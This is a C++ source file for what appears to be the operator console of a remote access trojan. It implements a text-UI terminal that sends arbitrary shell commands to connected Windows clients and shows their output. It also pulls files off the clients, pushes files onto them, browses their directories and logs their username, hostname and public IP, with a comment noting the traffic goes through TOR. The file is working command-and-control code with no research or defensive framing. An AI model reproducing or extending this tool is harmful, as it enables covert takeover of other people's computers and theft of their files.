#include <mutex>
#include <vector>
#include <fcntl.h>
#include <filesystem>
#include <algorithm>
#include <sstream>
#include <sys/socket.h>

#include "imtui/imtui.h"

#include "logWindow.hpp"
#include "uiHelper.hpp"

/*
    Class for a connection to the server.
    Decided to put the terminal functions inside this class, hopefully that wasnt a bad idea and it doesnt get too messy
*/

struct fileBrowserEntry{
    std::string name;
    bool isDir = false;
};

class connection{
private:
    logWindow* servLogWin = nullptr; // Pointer to the log window
    std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
    std::string commandToSend = ""; // This will be derived from the input buffer
    const unsigned int inputBufferSize = 4096; // Size of the input buffer - could probably get rid of this dumb variable
    char inputBuffer[4096] = {0}; // Used for the text input box
    unsigned int cmdHistSelected = 0;
    std::vector<std::string> plainTextMessageHistory; // Elements of this vector are displayed in the terminal
    std::vector<std::string> commandHistory; // Stores a list of previously sent commands

    // File browser stuff:
    std::string currentDir = "";
    std::vector<fileBrowserEntry> currentDirFiles;

    void fileBrowserGetWorkingDir(){
        this->servLogWin->add("connection::fileBrowserGetWorkingDir() - INFO: Called");
        this->sockFdMutex.lock();
        
        int bytesSent = send(this->sockFd, "filebrowser;gwd;", 16, 0);
        if(bytesSent < 0){
            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("Error: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Read the response from the client
        char buffer[512] = {0}; // 512 is easily enough for a windows path
        int bytesReceived = recv(this->sockFd, buffer, 512, 0);
        if(bytesReceived < 0){
            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response
        // FORMAT: "filebrowser;gwd;[path];"
        std::string response = std::string(buffer);
        if(response.length() < 16){
            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: Response too short");
            this->plainTextMessageHistory.push_back("Error: Response too short");
            this->sockFdMutex.unlock();
            return;
        }
        this->currentDir = response.substr(16, response.length() - 17); // Remove the "filebrowser;gwd;" and the ";" at the end
    
        // For debug, print to log
        this->servLogWin->add("connection::fileBrowserGetWorkingDir() - INFO: Current working directory: " + this->currentDir);
        this->sockFdMutex.unlock();
    }

    /*
        Updates the currentDirFiles vector with the contents of the client's current working directory
    */
    void fileBrowserUpdate(){
        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Called");
        this->sockFdMutex.lock();

        int bytesSent = send(this->sockFd, "filebrowser;ls;", 15, 0);
        if(bytesSent < 0){
            this->servLogWin->add("connection::fileBrowserGetWorkingDir() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("Error: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Receive the first 4096 bytes of the response
        // The format of the response is:
        // filebrowser;ls;[response length];[response];
        // where [response] looks like: 0[filename];1[filename];
        // where 0 and 1 indicate whether or not the file is a directory
        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Receiving first 4096 bytes of response from client...");
        char buffer[4096] = {0};
        int bytesReceived = recv(this->sockFd, buffer, 4096, 0);
        if(bytesReceived < 0){
            this->servLogWin->add("connection::fileBrowserUpdate() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response to get the size of the response
        std::string responseString = std::string(buffer);
        unsigned int responseSize = 0;
        try{
            responseSize = std::stoi(responseString.substr(15, responseString.find(";", 15) - 15));
        }catch(...){
            this->servLogWin->add("connection::fileBrowserUpdate() - ERR: std::stoi failed, client sent invalid response");
            this->plainTextMessageHistory.push_back("Error: std::stoi failed, client sent invalid response");
            this->sockFdMutex.unlock();
            return;
        }
        this->servLogWin->add("connection::fileBrowserUpdate() - INFO: Response size: " + std::to_string(responseSize));

        // Receive the rest of the response
        unsigned int bytesReceivedTotal = bytesReceived;
        while(bytesReceivedTotal < responseSize){
            memset(buffer, 0, 4096);
            bytesReceived = recv(this->sockFd, buffer, 4096, 0);
            if(bytesReceived < 0){
                this->servLogWin->add("connection::fileBrowserUpdate() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->plainTextMessageHistory.push_back("Error: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->sockFdMutex.unlock();
                return;
            }
            bytesReceivedTotal += bytesReceived;
            responseString.append(std::string(buffer));
        }
        this->sockFdMutex.unlock();

        // Parse the response, putting it in this->currentDirFiles
        this->currentDirFiles.clear();
        int headerSize = 15+std::to_string(responseSize).length()+1;
        responseString = responseString.substr(headerSize, responseString.length()-headerSize);

        std::stringstream ss(responseString);
        std::string token;
        while(std::getline(ss, token, ';')){
            struct fileBrowserEntry fbe;
            fbe.isDir = token[0]=='1';
            fbe.name = token.substr(1);
            this->currentDirFiles.push_back(fbe);
        }
    }


    /*
        Reads all the data from the socket (flushes the socket)
        Uses non-blocking mode
    */
    void flushSocket(){
        this->sockFdMutex.lock();
        char buffer[1024] = {0};
        int flags = fcntl(this->sockFd, F_GETFL, 0); // Save the flags so they can be restored later
        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
        int bytesReceived = 0;
        do{
            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        }while(bytesReceived > 0);
        fcntl(this->sockFd, F_SETFL, flags);
        this->sockFdMutex.unlock();
    }

    /*
        Parses the given command and calls the appropriate function
    */
    void parseSendCmd(std::string cmd){
        this->servLogWin->add("connection::parseSendCmd() - INFO: Called with cmd: " + cmd);
        this->plainTextMessageHistory.push_back("--> " + cmd);
        if(cmd == "clear"){
            this->plainTextMessageHistory.clear();
        }

        // These commands just make things a but more linux-like (they just call the windows equivalent)
        else if(cmd == "pwd"){
            this->exec("cd");
        }
        else if(cmd == "ls -a" || cmd == "ls -la"){ // ls -la is what i type out of habit, so ill add it even though really the -l doesnt do anything
            this->exec("dir /a");
        }
        else if(cmd == "ls"){
            this->exec("dir");
        }
        else if(cmd.starts_with("rm ")){
            this->exec("del " + cmd.substr(3));
        }
        else if(cmd.starts_with("mkdir ")){
            this->exec("md " + cmd.substr(6));
        }

        // Special commands that require their own special function:
        else if(cmd.starts_with("cd ")){ // cd cant be handled by exec() becase _popen cant change the working directory of the client executable
            this->servLogWin->add("connection::parseSendCmd() - INFO: Changing working directory to " + cmd.substr(3));
            this->genericCmd("cd;" + cmd.substr(3) + ";");
            this->fileBrowserGetWorkingDir();
            this->fileBrowserUpdate();
        }
        else if(cmd.starts_with("grab ")){
            this->grab(cmd.substr(5));
        }
        else if(cmd.starts_with("upload ")){
            this->upload(cmd.substr(7));
        }

        // If the command is not something special, just send it to the client using exec() and see what happens
        else{
            this->exec(cmd);
        }
    }

    /*
        genericCmd is used for very basic commands that dont require any special handling on the server side
        Response from client: <cmd>;<response>
        Response size is limited to 4096
    */
    void genericCmd(std::string cmd){
        this->servLogWin->add("connection::genericCmd() - INFO: Called with cmd: " + cmd);
        this->sockFdMutex.lock();

        // Send the command to the client:
        int bytesSent = send(this->sockFd, cmd.c_str(), cmd.length(), 0);
        this->servLogWin->add("connection::genericCmd() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
        if(bytesSent < 0){ // A negative value indicates an error
            this->servLogWin->add("connection::genericCmd( - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Receive the response from the client:
        this->servLogWin->add("connection::genericCmd() - INFO: Waiting for response from client (max 4096 bytes)...");
        char cmdRecvBuffer[4096] = {0}; // 4096 bytes should easily be enough for the responses to any commands sent using this function
        int bytesReceived = recv(this->sockFd, cmdRecvBuffer, 4096, 0);
        if(bytesReceived < 0){ // A negative value here also indicates an error. Not sure if I really need to be handling this error (will it actually occur?)
            this->servLogWin->add("connection::genericCmd() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response and append it to the message history:
        std::string cmdRecvBufferString = std::string(cmdRecvBuffer); // Convert to a string for easier parsing
        if(cmdRecvBufferString.starts_with(cmd)){ // Protocol requires that the cmd sent is sent back in the response
            this->plainTextMessageHistory.push_back(cmdRecvBufferString.substr(cmd.length(), cmdRecvBufferString.length() - cmd.length() - 1)); // Extract just the <response> from "<cmd>;<response>;"
            this->servLogWin->add("connection::genericCmd() - INFO: Response received and appended to message history");
            this->sockFdMutex.unlock();
        }else{
            this->servLogWin->add("connection::genericCmd() - WARN: Received an unexpected response from the client");
            this->plainTextMessageHistory.push_back("WARN: Received an unexpected response from the client:");
            this->plainTextMessageHistory.push_back(cmdRecvBufferString);
        }
    }

    /*
        Grab a file from the client
        The response from the client will be in the format:
            grab;<file path>;<file size>;<file data>;
        The file data is in raw bytes, so it can be written to a file as-is
    */
    void grab(std::string path){
        this->servLogWin->add("connection::grab() - INFO: Called with path: " + path);
        this->sockFdMutex.lock();

        // Send the grab command to the client:
        int bytesSent = send(this->sockFd, ("grab;" + path + ";").c_str(), path.length() + 6, 0);
        this->servLogWin->add("connection::grab() - INFO: Sent " + std::to_string(bytesSent) + " bytes to client");
        if(bytesSent < 0){
            this->servLogWin->add("connection::grab() - ERR: send() returned " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Receive 4096 bytes from the client - this will include the file size and the first chunk of the file (or all of it if it's smaller than 4096 bytes):
        this->servLogWin->add("connection::grab() - INFO: Receiving first 4096 bytes from client...");
        char grabRecvBuffer[4096] = {0};
        int bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->servLogWin->add("connection::grab() - ERR: recv() returned " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response to get the file size:
        std::string grabRecvBufferString = std::string(grabRecvBuffer); // Cant use this string for any of the file data, because null terminated :(
        if(grabRecvBufferString.substr(0, 5+path.size()+1) != "grab;" + path + ";" || grabRecvBufferString[5+path.size()+1] == '0'){
            this->servLogWin->add("connection::grab() - ERR: Received bad response format / file not found");
            this->plainTextMessageHistory.push_back("ERR: Received bad response format / file not found");
            this->plainTextMessageHistory.push_back(grabRecvBufferString);
            this->plainTextMessageHistory.push_back("grab;" + path + ";");
            this->sockFdMutex.unlock();
            return;
        }
        long long int fileSize;
        try{
            fileSize = std::stoull(grabRecvBufferString.substr(5+path.size()+1));
        }catch(...){
            this->servLogWin->add("connection::grab() - ERR: std::stoull failed, client sent invalid response");
            this->plainTextMessageHistory.push_back("ERR: std::stoull failed, client sent invalid response");
            this->sockFdMutex.unlock();
            return;
        }
        this->servLogWin->add("connection::grab() - INFO: Full file size: " + std::to_string(fileSize));

        // Read the file data into an std::vector<char>, receive more data from the socket if the fileSize is greater than what has been received so far:
        std::vector<char> fileData;
        fileData.reserve(fileSize); // Hopefully speeds up the insert() calls as memory is already allocated
        unsigned int headerSize = 5+path.size()+1+std::to_string(fileSize).size()+1; // The size of "grab;[path];[file size];", so we can ignore it when 
        fileData.insert(fileData.end(), grabRecvBuffer+headerSize, grabRecvBuffer+bytesReceived); // Insert the data that was received in the first recv() call, minus the header
        long long int bytesReceivedTotal = bytesReceived - headerSize; // The total number of bytes of actual file data that has been received so far
        if((long long int)fileSize-(long long int)bytesReceivedTotal > 0){
            this->servLogWin->add("connection::grab() - INFO: Receiving remaining " + std::to_string((long long int)fileSize-(long long int)bytesReceivedTotal) + " bytes of data");
        }
        while(bytesReceivedTotal < fileSize){
            bytesReceived = recv(this->sockFd, grabRecvBuffer, 4096, 0);
            if(bytesReceived < 0){
                // Get the error code and append it to the message history:
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->sockFdMutex.unlock();
                return;
            }
            fileData.insert(fileData.end(), grabRecvBuffer, grabRecvBuffer+bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }
        this->servLogWin->add("connection::grab() - INFO: Received full response (" + std::to_string(fileSize) + " bytes)");

        // Write the file data to disk:
        this->plainTextMessageHistory.push_back("Recieved " + std::to_string(bytesReceivedTotal) + " bytes of data");
        std::ofstream of("./" + path, std::ios::binary); // !!!! unsanitized path, user stupidity could lead to overwriting files
        of.write(fileData.data(), fileData.size());
        of.close();
        this->servLogWin->add("connection::grab() - INFO: File written to disk at ./" + path);
        this->plainTextMessageHistory.push_back("File written to disk at ./" + path);

        this->sockFdMutex.unlock();
    }

    /*
        Upload a file to the client
        The request to the client will be in the format:
            upload;<file name>;<file size>;<file data>;
    */
    void upload(std::string path){
        this->servLogWin->add("connection::upload() - INFO: Called with path: " + path);
        // Open the local file:
        std::ifstream f(path, std::ios::binary);
        if(f.is_open() != true){ // Most likely, the file does not exist
            this->servLogWin->add("connection::upload() - ERR: File not found");
            this->plainTextMessageHistory.push_back("ERR: File not found");
        }else{
            this->sockFdMutex.lock();

            // Create the upload request:
            // "upload;<file name>;<file size>;<file data>;"
            this->servLogWin->add("connection::upload() - INFO: Preparing upload request");
            std::string header = "upload;" + std::filesystem::path(path).filename().string() + ";" + std::to_string(std::filesystem::file_size(path)) + ";";
            std::vector<char> uploadData;
            uploadData.reserve(header.size() + std::filesystem::file_size(path));
            uploadData.insert(uploadData.end(), header.begin(), header.end());
            uploadData.insert(uploadData.end(), std::istreambuf_iterator<char>(f), std::istreambuf_iterator<char>());
            f.close();

            // Send the upload request to the client:
            int bytesSent = send(this->sockFd, uploadData.data(), uploadData.size(), 0);
            if(bytesSent < 0){
                this->servLogWin->add("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
                this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
                this->sockFdMutex.unlock();
                return;
            }
            this->servLogWin->add("connection::upload() - INFO: Sent upload request");

            // Receive the response from the client:
            char responseBuffer[1024] = {0};
            this->servLogWin->add("connection::upload() - INFO: Waiting for response (max 1024 bytes)");
            int bytesReceived = recv(this->sockFd, responseBuffer, 1024, 0);
            if(bytesReceived < 0){
                this->servLogWin->add("connection::upload() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->sockFdMutex.unlock();
                return;
            }
            this->servLogWin->add("connection::upload() - INFO: Received response: " + std::string(responseBuffer));
            this->plainTextMessageHistory.push_back("Response: " + std::string(responseBuffer));
            
            this->sockFdMutex.unlock();
        }
    }

    /*
        Executes a command on the client via _popen()
        Command output will be sent back to the server
        Command output can be of any length, to handle this the response from the client will be in the format:
            exec;<command>;<response length>;<response data>;
    */
    void exec(std::string cmd){
        this->servLogWin->add("connection::exec() - INFO: Called with cmd: " + cmd);
        this->servLogWin->add("connection::exec() - INFO: Automatically appending 2>&1 to the command to receive stderr");
        cmd += " 2>&1"; // Redirects stderr to stdout
        this->sockFdMutex.lock();

        // Send the command to the client
        int bytesSent = send(this->sockFd, ("exec;" + cmd + ";").c_str(), cmd.length() + 6, 0);
        if(bytesSent < 0){
            this->servLogWin->add("connection::exec() - ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }
        this->servLogWin->add("connection::exec() - INFO: Sent " + std::to_string(bytesSent) + " bytes of data, waiting for response");

        // Receive the first 4096 bytes of the response
        char responseBuffer[4096] = {0};
        this->servLogWin->add("connection::exec() - INFO: Receiving first 4096 bytes of response");
        int bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
        if(bytesReceived < 0){
            this->servLogWin->add("connection::exec() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
            this->sockFdMutex.unlock();
            return;
        }

        // Parse the response size from the response:
        std::string responseBufferString = std::string(responseBuffer);
        if(responseBufferString.substr(0, 6+cmd.size()) != "exec;" + cmd + ";"){
            this->servLogWin->add("connection::exec() - ERR: Received bad response format");
            this->plainTextMessageHistory.push_back("ERR: Received bad response format");
            this->plainTextMessageHistory.push_back(responseBufferString);
            this->sockFdMutex.unlock();
            return;
        }
        long long int responseSize;
        try{
            responseSize = std::stoull(responseBufferString.substr(6+cmd.size()));
        }catch(...){
            this->servLogWin->add("connection::exec() - ERR: std::stoull failed, client sent invalid response");
            this->plainTextMessageHistory.push_back("ERR: std::stoull failed, client sent invalid response");
            this->sockFdMutex.unlock();
            return;
        }
        this->servLogWin->add("connection::exec() - INFO: Full response size: " + std::to_string(responseSize));

        // Add the first 4096-<header size> bytes of the first chunk of the response to the response vector:
        std::vector<char> response;
        response.reserve(responseSize); // reserve will hopefully make the vector a bit faster by allocating the memory in advance
        unsigned int headerSize = 6+cmd.size()+1+std::to_string(responseSize).size(); // The size of "exec;[cmd];[response size];". Creating this variable because its quite long and its used a whole two times
        response.insert(response.end(), responseBufferString.begin()+headerSize, responseBufferString.end());

        // Receive more chunks of 4096 bytes until the total number of bytes received is equal to the response size:
        long long int bytesReceivedTotal = bytesReceived - headerSize;
        if((long long int)responseSize-(long long int)bytesReceivedTotal > 0){
            this->servLogWin->add("connection::exec() - INFO: Receiving remaining " + std::to_string((long long int)responseSize-(long long int)bytesReceivedTotal) + " bytes of response");
        }
        while(bytesReceivedTotal < responseSize){
            bytesReceived = recv(this->sockFd, responseBuffer, 4096, 0);
            if(bytesReceived < 0){
                this->plainTextMessageHistory.push_back("ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
                this->sockFdMutex.unlock();
                return;
            }
            response.insert(response.end(), responseBuffer, responseBuffer+bytesReceived); // Insert the received bytes into the end of the response vector
            bytesReceivedTotal += bytesReceived;
        }
        this->servLogWin->add("connection::exec() - INFO: Received full response (" + std::to_string(responseSize) + " bytes)");

        // Add the response to the plain text message history:
        // Split it up based on newlines to prevent crashing imgui (a single giant line will cause imgui/imtui to try and render too many triangles)
        // Example: calling "exec dir" inside system32 will return lots of stuff and it made it crash lol, but now it doesn't
        std::stringstream ss(std::string(response.begin(), response.end()-1));
        std::string line;
        while(std::getline(ss, line, '\n')){
            this->plainTextMessageHistory.push_back(line);
        }
        this->servLogWin->add("connection::exec() - INFO: Response received and added to message history successfully");
        this->sockFdMutex.unlock();
    }



public:
    // Public variables that the server class uses to display info and keep track of the connection:
    int sockFd = -1; // Socket file descriptor - assumed to be valid when the object is created
    std::string username;
    std::string hostname;
    std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
    bool terminalActive = false; // Whether or not the terminal is being displayed and used



    // Constructor and destructor are pretty basic:
    connection(int sockFd, logWindow* logWin){
        this->servLogWin = logWin;
        this->sockFd = sockFd;
    }

    ~connection(){
        this->sockFdMutex.lock();
        close(this->sockFd);
        this->sockFdMutex.unlock();
    }

    /*
        Draws the terminal window
        Consists of a scrolling text box and an input box which sends the message when enter is pressed
        The input box is set to always have keyboard focus
    */
    void draw(float wStartXNorm,
              float wStartYNorm,
              float wEndXNorm,
              float wEndYNorm,
              ImGuiCond wCondition=ImGuiCond_Always){
        uiHelper::setNextWindowSizeNormalised(wStartXNorm,
                                              wStartYNorm,
                                              wEndXNorm,
                                              wEndYNorm,
                                              wCondition);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());

        // Draw the scrolling text box, adding each item from this->plainTextMessageHistory:
        ImGui::BeginChild("Scrolling", ImVec2(0, -2), false);
        for(auto m : this->plainTextMessageHistory){
            ImGui::TextWrapped("%s", m.c_str());
        }
        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){ // If the window is scrolled to the bottom, scroll down automatically when new text is added
            ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();

        // If up/down key pressed, then set the input buffer to the appropriate command from the history
        if(ImGui::IsKeyReleased(ImGui::GetKeyIndex(ImGuiKey_UpArrow)) || ImGui::IsKeyReleased(ImGui::GetKeyIndex(ImGuiKey_DownArrow))){
            // Adjust history selection position
            bool isUp = ImGui::IsKeyReleased(ImGui::GetKeyIndex(ImGuiKey_UpArrow));
            if(isUp && this->cmdHistSelected < this->commandHistory.size()){
                this->cmdHistSelected++;
            }else if(!isUp && this->cmdHistSelected > 0){
                this->cmdHistSelected--;
            }
            // Insert history msg into input buff
            if(this->commandHistory.size() > 0 && this->cmdHistSelected != 0){
                ImGui::ClearActiveID(); // Remove focus from input box so the contents of the input buffer can be modified
                memset(this->inputBuffer, 0, this->inputBufferSize);
                strcpy(this->inputBuffer, this->commandHistory[this->commandHistory.size()-this->cmdHistSelected].c_str());
                ImGui::SetKeyboardFocusHere(); // Bring focus back to input box
            }
            // Clear the buffer if scrolling back down to 0
            if(this->cmdHistSelected == 0){
                ImGui::ClearActiveID();
                memset(this->inputBuffer, 0 , this->inputBufferSize);
                ImGui::SetKeyboardFocusHere();
            }
        }

        ImGui::SetNextItemWidth(ImGui::GetContentRegionAvailWidth());
        if(ImGui::InputText("##Input", this->inputBuffer, this->inputBufferSize, ImGuiInputTextFlags_EnterReturnsTrue)){ // If enter is pressed, then set this->commandToSend to the contents of the input buffer
            this->commandToSend = std::string(this->inputBuffer); // this->commandToSend will be processed when this->update() is called
            if(this->commandToSend != ""){
                this->commandHistory.push_back(this->commandToSend);
                this->cmdHistSelected = 0;
                memset(this->inputBuffer, 0, this->inputBufferSize); // Clear the input buffer
            }
        }

        // Set the keyboard focus to the input box (as long as its not being used for something else):
        if(!ImGui::IsAnyItemActive() && !ImGui::IsMouseClicked(0)){
            ImGui::SetKeyboardFocusHere();
        }

        ImGui::End();
    }

    /*
        Draws the file browser window
        Consists of a list of the current directory's files/folders and a button to go up a directory
        The list of files/folders is scrollable
    */
    void drawFileBrowser(float wStartXNorm,
                               float wStartYNorm,
                               float wEndXNorm,
                               float wEndYNorm,
                               ImGuiCond wCondition=ImGuiCond_Always){
        uiHelper::setNextWindowSizeNormalised(wStartXNorm,
                                              wStartYNorm,
                                              wEndXNorm,
                                              wEndYNorm,
                                              wCondition);
        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " file browser").c_str());
        ImGui::TextWrapped("Current directory: %s", this->currentDir.c_str());
        ImGui::Dummy(ImVec2(0, 2)); // Add some space between the text and the button

        // Draw the button to go up a directory:
        if(ImGui::Button("^ Parent directory")){
            this->commandToSend = "cd .."; // Set this->commandToSend, just like how the user would
        }

        // Draw the list of files/folders:
        ImGui::BeginChild("Scrolling", ImVec2(0, -2), false);
        // Dummy data for testing purposes:
        for(auto f : this->currentDirFiles){

            if(f.isDir){
                std::string buttonName = f.name;
                if(ImGui::Button(buttonName.c_str())){
                    this->commandToSend = "cd " + f.name;
                }
            }else{
                ImGui::TextWrapped("%s", f.name.c_str());
            }


        }
        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){ // If the window is scrolled to the bottom, scroll down automatically when new text is added
            ImGui::SetScrollHereY(1.0f);
        }
        ImGui::EndChild();


        ImGui::End();
    }


    /*
        Handles the initial connection with the client
        Returns true if the connection was successful, false otherwise
        The client must send their username, hostname, and public IP in the format "ip;username;hostname;"
        If the client does not send this information in the correct format, the connection will be closed
        The server responds to the client with with "ip;username;hostname;connected;" if the connection was successful
    */
    bool intialConnection(){
        this->servLogWin->add("connection::intialConnection() - INFO: Starting initial connection with client");
        this->sockFdMutex.lock();

        // Receive the initial connection message from the client:
        char buffer[1024] = {0}; // Should easily be enough space
        int bytesReceived = recv(this->sockFd, buffer, 1024, 0);
        if(bytesReceived < 0){
            this->servLogWin->add("connection::intialConnection() - ERR: recv(): " + std::to_string(bytesReceived) + " | " + strerror(errno));
            return false;
        }
        this->servLogWin->add("connection::intialConnection() - INFO: Received initial connection message from client (" + std::to_string(bytesReceived) + " bytes)");

        // Parse the message:
        std::string bufferString = std::string(buffer); // Convert to a string for easier parsing
        if(std::count(bufferString.begin(), bufferString.end(), ';') != 3){
            this->servLogWin->add("connection::intialConnection() - WARN: Received bad initial connection message from client");
            return false;
        }
        this->publicIp = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->username = bufferString.substr(0, bufferString.find(';'));
        bufferString = bufferString.substr(bufferString.find(';') + 1);
        this->hostname = bufferString.substr(0, bufferString.find(';'));
        this->servLogWin->add("connection::intialConnection() - INFO: Parsed client info: " + this->publicIp + " | " + this->username + " | " + this->hostname);
        // ... add some more verification here if you want to make extra sure the client is sending valid data ...

        // Send the confirmation message to the client, since the connection was successful:
        std::string confirmMsg = this->publicIp + ";" + this->username + ";" + this->hostname + ";connected;";
        int bytesSent = send(this->sockFd, confirmMsg.c_str(), confirmMsg.length(), 0);
        if(bytesSent < 0){
            this->servLogWin->add("connection::intialConnection() - ERR: send(): " + std::to_string(bytesSent) + " | " + strerror(errno));
            return false;
        }
        this->servLogWin->add("connection::intialConnection() - INFO: Sent confirmation message to client");

        this->sockFdMutex.unlock();

        sleep(1); // Wait a second to make sure the connection confirmation message and further messages dont get combined
        this->fileBrowserGetWorkingDir();
        this->fileBrowserUpdate();
        return true;
    }

    /*
        Parses and sends the command in this->commandToSend if there is one
        Also flushes the socket (read everything in recv buff)
    */
    void update(){
        // If this->commandToSend is not empty, then there is a command that needs to be processed:
        if(this->commandToSend != ""){
            this->parseSendCmd(this->commandToSend);
            this->commandToSend = ""; // Clear commandToSend now that the command has been processed
        }
        this->flushSocket(); // Clear out the recv buffer
    }

    /*
        Returns true if the client responds to "ping;" with "pong;"
    */
    bool connectivityCheck(){
        this->sockFdMutex.lock();
        int bytesSent = send(this->sockFd, "ping;", 5, 0);
        if(bytesSent != 5){
            this->sockFdMutex.unlock();
            return false;
        }
        char buffer[10] = {0};
        int bytesReceived = recv(this->sockFd, buffer, 10, 0);
        if(std::string(buffer) != "ping;pong;"){
            this->sockFdMutex.unlock();
            return false;
        }
        this->sockFdMutex.unlock();
        return true;
    }

    /*
        The purpose of closeTerminal() is to set this->terminalActive to false and flush the socket
        Flushing the socket is necessary because data may be left in the socket buffer, which will cause the ping-pong to fail and the connection to be closed
        Does not close the socket, that is done by the destructor. This function is just used to close the terminal window
    */
    void closeTerminal(){
        this->terminalActive = false;
        this->flushSocket();
    }

};
